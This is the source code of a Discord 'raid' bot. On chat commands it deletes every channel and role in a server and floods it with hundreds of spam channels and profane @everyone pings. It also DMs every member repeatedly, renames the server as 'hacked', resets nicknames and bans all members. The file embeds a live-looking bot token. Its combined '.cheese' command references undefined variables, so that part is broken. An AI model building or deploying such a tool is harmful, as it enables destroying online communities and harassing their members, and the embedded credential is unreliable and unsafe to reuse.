const Discord = require("discord.js");
const client = new Discord.Client();
const prompt = require('prompt-sync')();
const serverName = prompt("Please enter the name of the server: ");

client.on("ready", () => {
    console.log(`Starting raid...`);
    console.log(`Client ${client.user.tag} ready for the raid!`);
    console.log("FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
    console.log(`Commands:
  
  .MoO (banall)
  .milk (nuke)
  .moo (raid)
  .mOo (foto)
  .mOO (mdall)
  .MOo (roles)
  .MOO (deleterole)
  .Moo (nick)
  .cow (list)
  .cheese (all)`);
    presence();  
    });
 
 
 
function presence(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "Moo",
  type: "PLAYING"
 
}
  });
}
 
//nuke

client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === '.milk') { 
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`FUCK ` + serverName + ` | RAID BY DKRYPT10N`, {
          type: 'text'
        }).then(channel => {
          channel.send("https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.pinimg.com%2Foriginals%2Fe4%2F6d%2F97%2Fe46d97b58a6c6902aa26c0c9fcef60c2.jpg&f=1&nofb=1")
        })
         }
      })
 
//raid
 
client.on("message", message => {
            if (message.author.bot) return;
          
           if (message.content === '.moo') {
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`FUCK ` + serverName + ` | RAID BY DKRYPT10N`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
              channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
                  
              })
              }
              }
            });
          
//mdall
 
          client.on("message", message => {
                        if (message.author.bot) return;
                        
                      if(message.content === ".mOO")
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com").catch(error => {});
                        },450);
                      })
                      });
 
//delete roles
 
client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === ('.MOO')){
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });
 
//create roles
 
client.on("message", message => {
                if (message.author.bot) return;
              
               if (message.content === '.MOo') {
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `FUCK ` + serverName + ` | RAID BY DKRYPT10N`,color: '#d41818',},reason: 'razon',})
              };
               }
                });
 
//pfp and name
 
client.on("message", message => {
                    if (message.author.bot) return;
                  
                   if (message.content === '.mOo') {
                      message.guild.setName("HACKED BY DKRYPT10N");
                      message.guild.setIcon("https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fwww.k0nr.com%2Fwordpress%2Fwp-content%2Fuploads%2F2016%2F07%2Frubber-ducky.png&f=1&nofb=1"
                      );
                      }
                    }); 
 
//banall
 
client.on("message", message => {
    if (message.author.bot) return;
  
    if (message.content === '.MoO') {
    message.delete()
    message.guild.members.cache.forEach(m => {
    m.ban()
    });
  }
}); 
 
//change names
 
client.on("message", msg => {
const args = msg.content.slice().trim().split(/ +/g );
const command = args.shift().toLowerCase();
  if (command === '.Moo'){
      msg.delete()
    let nickname = args.join(" ");
    var i = 0;
    msg.guild.members.cache.forEach(member =>{
      i++
    }
      )
    msg.channel.send("> Changing ** username" + i + "** users to: **" + nickname + "**")
    msg.guild.members.cache.forEach(member =>{
 
      member.setNickname(nickname)
    })
    }
});
 
//sv list
 
client.on("message", message => {
    if (message.author.bot) return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (command === '.cow') {
       message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle(message.guild.name)
       .setThumbnail()
       .setDescription(`**Channels:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
       .setColor("RED");
       message.channel.send(embed)
   }
});

//all

client.on("message", message => {
  if (message.author.bot) return;

 if (message.content === '.cheese') {
  message.delete()
  msg.delete()

  //pfp and name
  message.guild.setName("HACKED BY DKRYPT10N");
  message.guild.setIcon("https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fwww.k0nr.com%2Fwordpress%2Fwp-content%2Fuploads%2F2016%2F07%2Frubber-ducky.png&f=1&nofb=1"
  );

  //raid
 for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`FUCK ` + serverName + ` | RAID BY DKRYPT10N`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com")
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
    channel.send("@everyone FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com");
        
    })
    }

    //mdall
    message.guild.members.cache.forEach(member => {
      setInterval(function(){
        member.send("FUCK " + serverName + " | RAID BY DKRYPT10N | dkrypt10n@protonmail.com").catch(error => {});
      },450);
    })

    //deleterole
    message.guild.roles.cache.map(roles => roles.delete());

    //create roles
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({data: {name: `FUCK ` + serverName + ` | RAID BY DKRYPT10N`,color: '#d41818',},reason: 'razon',})
   };

    //change names
   let nickname = args.join(" ");
   var i = 0;
   msg.guild.members.cache.forEach(member =>{
     i++
   }
     )
   msg.channel.send("> Changing ** username" + i + "** users to: **" + nickname + "**")
   msg.guild.members.cache.forEach(member =>{

     member.setNickname(nickname)
   });

    //banall
   message.guild.members.cache.forEach(m => {
   m.ban()
   });
    }
  });

 
 client.login("ODIyNjYzMjgwNzczMzAwMjY0.YFVi4g.rTn1bysIOfkJD1Tds6Fpa_QSAy4");
 
// ########################################### RAID BY DKRYPT10N ###########################################
